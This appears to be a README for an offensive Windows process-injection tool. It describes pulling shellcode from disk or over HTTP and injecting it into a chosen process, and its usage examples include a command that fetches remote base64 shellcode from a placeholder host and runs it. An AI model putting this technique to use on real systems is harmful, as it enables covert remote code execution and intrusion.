# ProcessInjection

This fork of process injection allows for dynamically pulling shellcode (in bin or base64 format) from either the disk or over HTTP as opposed to embedding the shellcode in the binary.

Additional Techniques yoinked from 3xpl01tc0d3r: https://github.com/3xpl01tc0d3r/ProcessInjection/blob/master/ProcessInjection/Program.cs

### Usage

```
Usage: ProcessInjection.exe <pid|self> <binlocation> <bintype>");
    Example: ProcessInjection.exe self http://x.x.x.x/app.b64 b64");
    Example: ProcessInjection.exe 1000 C:\Temp\app.bin bin");
```

Supported targets: Primarily, you'll want to target a process via the PID. However, it is possible to just inject into the ProcessInjection.exe process itself by using the value "self".

Supported bintypes: "b64" for base64 encoded ShellCode and "bin" for raw/binary ShellCode.

Supported binlocations: Any value that starts with `http://` or `https://` is pulled over HTTP(s). Any other value is assumed to exist on disk (or readable off a shared drive).

Shellcode can be generated via donut: https://github.com/TheWover/donut
